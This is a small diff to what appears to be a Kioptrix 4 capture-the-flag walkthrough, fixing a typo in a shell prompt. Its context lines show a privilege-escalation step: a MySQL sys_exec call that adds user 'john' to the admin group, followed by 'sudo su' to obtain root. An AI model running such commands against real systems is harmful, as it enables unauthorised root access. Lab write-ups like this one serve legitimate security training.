@@ -194,7 +194,7 @@ mysql> select  sys_exec('usermod -a -G admin john');
 mysql> exit
 Bye
 john@Kioptrix4:~$ sudo su
-sudo] password for john:
+[sudo] password for john:
 root@Kioptrix4:/home/john# whoami
 root
 ```
